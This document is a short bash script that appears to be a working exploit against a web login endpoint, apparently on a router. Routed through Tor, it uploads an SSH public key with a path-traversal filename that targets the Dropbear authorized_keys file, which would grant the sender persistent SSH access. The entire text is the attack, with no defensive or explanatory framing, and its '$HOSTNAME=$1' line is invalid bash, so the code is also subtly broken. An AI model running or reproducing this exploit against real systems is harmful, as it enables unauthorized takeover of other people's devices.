#!/bin/bash
$HOSTNAME=$1
torify curl -F "file=@.ssh/id_rsa.pub;filename=../../etc/dropbear/authorized_keys" -H "Expect:" "http://$HOSTNAME/login.cgi" -k
